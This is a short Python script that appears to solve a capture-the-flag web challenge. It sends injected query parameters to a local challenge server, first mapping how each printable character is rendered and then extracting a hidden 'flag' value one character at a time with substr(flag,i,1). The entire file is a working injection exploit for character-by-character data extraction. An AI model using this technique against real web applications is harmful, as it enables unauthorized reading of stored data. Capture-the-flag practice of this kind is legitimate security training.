from pwn import log
from string import printable
from requests import get
from re import search


def ctf():
    m = {}
    with log.progress('Mapping characters') as progress:
        for c in printable:
            progress.status(f'Mapping {c}')
            response = get('http://challenge.localhost:80',
                           params={'query': f"'{c}'"})
            if match := search(r'<b>Results:</b><pre>(\S+)</pre>', response.text):
                result = match.groups(1)
                m[result] = c
    f = []
    with log.progress('Capture the flags') as progress:
        for i in range(64):
            progress.status(f'Capture #{i}')
            response = get('http://challenge.localhost:80',
                           params={'query': f"substr(flag,{i},1)"})
            if match := search(r'<b>Results:</b><pre>(\S+)</pre>', response.text):
                result = match.groups(1)
                if result in m:
                    f.append(m[result])
    log.success('Flag: %s', ''.join(f))


if __name__ == "__main__":
    ctf()
